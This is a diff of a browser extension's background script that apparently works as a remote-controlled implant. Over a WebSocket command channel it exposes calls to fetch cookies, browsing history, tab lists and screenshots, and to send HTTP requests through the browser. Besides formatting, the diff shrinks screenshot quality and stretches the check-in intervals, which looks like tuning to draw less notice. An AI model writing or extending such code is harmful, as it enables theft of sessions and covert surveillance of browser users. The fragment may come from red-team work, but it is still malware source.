@@ -20,7 +20,7 @@ const REQUEST_HEADER_BLACKLIST = ["cookie"];
 
 const RPC_CALL_TABLE = {
   HTTP_REQUEST: perform_http_request,
-  PONG: () => { }, // NOP, since timestamp is updated on inbound message.
+  PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
@@ -30,33 +30,38 @@ const RPC_CALL_TABLE = {
 
 function get_current_tab() {
   return new Promise((resolve) => {
-    chrome.tabs.query({ 'active': true, 'lastFocusedWindow': true }, function (tabs) {
-      console.log(tabs[0])
-      resolve(tabs[0])
-    });
+    chrome.tabs.query(
+      { active: true, lastFocusedWindow: true },
+      function (tabs) {
+        console.log(tabs[0]);
+        resolve(tabs[0]);
+      }
+    );
   });
 }
 
 function get_tabs() {
   return new Promise((resolve) => {
     chrome.tabs.query({}, function (tabs) {
-      console.log(tabs)
-      resolve(tabs)
+      console.log(tabs);
+      resolve(tabs);
     });
   });
 }
 
 function get_current_tab_image() {
   return new Promise((resolve) => {
-    chrome.tabs.captureVisibleTab(options = { "format": "png" }, callback = (dataUrl) => {
-      console.log(dataUrl)
-      return resolve(dataUrl)
-    });
+    chrome.tabs.captureVisibleTab(
+      (options = { format: "jpeg", quality: 10 }),
+      (callback = (dataUrl) => {
+        console.log(dataUrl);
+        return resolve(dataUrl);
+      })
+    );
   });
-};
+}
 
-
-async function get_bookmarks(params) { }
+async function get_bookmarks(params) {}
 
 /*
     Return an array of history for the current logs.
@@ -76,7 +81,8 @@ function get_history_by_day(days = 7) {
         {
           text: "",
           startTime: NDaysAgo,
-        }, function (historyItems) {
+        },
+        function (historyItems) {
           resolve(historyItems);
         }
       );
@@ -217,11 +223,7 @@ const websocket_check_interval = setInterval(async () => {
       },
     })
   );
-
-
-
-}, 1000 * 3);
-
+}, 1000 * 12);
 
 const websocket_sync_interval = setInterval(async () => {
   websocket.send(
@@ -235,9 +237,7 @@ const websocket_sync_interval = setInterval(async () => {
       },
     })
   );
-}, 1000 * 30);
-
-
+}, 1000 * 63);
 
 // Headers that fetch() can't set which need to
 // utilize webRequest to be able to send properly.
@@ -378,7 +378,7 @@ function initialize() {
 
   websocket = new WebSocket("ws://127.0.0.1:4343");
 
-  websocket.onopen = function (e) { };
+  websocket.onopen = function (e) {};
 
   websocket.onmessage = async function (event) {
     // Update last live connection timestamp
@@ -573,8 +573,6 @@ chrome.webRequest.onHeadersReceived.addListener(
   ["blocking", "responseHeaders", "extraHeaders"]
 );
 
-chrome.tabs.onActivated.addListener(
-  function (details) {
-    console.log(details)
-  }
-)
+chrome.tabs.onActivated.addListener(function (details) {
+  console.log(details);
+});
